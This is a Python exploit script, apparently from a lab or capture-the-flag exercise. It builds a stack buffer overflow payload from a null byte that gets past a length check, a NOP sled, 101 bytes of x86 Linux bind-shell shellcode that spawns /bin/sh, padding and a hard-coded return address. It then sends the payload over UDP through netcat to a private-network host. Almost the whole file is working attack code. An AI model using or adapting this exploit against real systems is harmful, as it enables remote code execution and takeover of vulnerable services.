
# to bypass the length condition
scapeChar = b"\x00"

### Construct the payload

# do nothing commands
nop_sled = b"\x90" * 39

# 101 Bytes of shell code
shellCode = b"\x31\xc0\x50\x40\x50\x89\xc3\x40\x50\x89\xe1\xb0\x66\xcd\x80\x89\xc6\x31\xdb\x53\x66\x68\x05\x15\x66\x6a\x02\x89\xe1\x6a\x10\x51\x50\x89\xe1\xb3\x02\xb0\x66\xcd\x80\x31\xdb\x53\x56\x89\xe1\xb3\x04\xb0\x66\xcd\x80\x31\xdb\x53\x53\x56\x89\xe1\xb3\x05\xb0\x66\xcd\x80\x89\xd9\x83\xe9\x03\x89\xc3\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc9\x89\xca\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80"

padding = b"\x90" *  3

# 4 bytes
return_address = b"\x26\xb3\x04\x08"

# 1 + 39 + 101 + 3 + 4 = 144 = 128 + 16 
# 16 are: 
#   - 4 for base pointer
#   - 4 for address reg
#   - 4 as padding

#return_address = b"\x75\xd5\xff\xff"
# Combine payload components
payload = scapeChar +  nop_sled + shellCode + padding + return_address




# Use subprocess to call Netcat
process = subprocess.Popen(
      ['nc', '-u', '10.12.22.2', '2222'],
  #  ['nc', '-u', '127.0.0.1', '2222'],  # Netcat command
    stdin=subprocess.PIPE,              # Redirect standard input
    stdout=subprocess.PIPE,             # Redirect standard output (optional)
    stderr=subprocess.PIPE              # Redirect standard error (optional)
)

# Send the payload
# stdout, stderr = process.communicate(input=payload)
stdout, stderr = process.communicate(input=payload)

# Optional: Print the response from the server
if stdout:
    print(stdout.decode())
if stderr:
    print(stderr.decode())
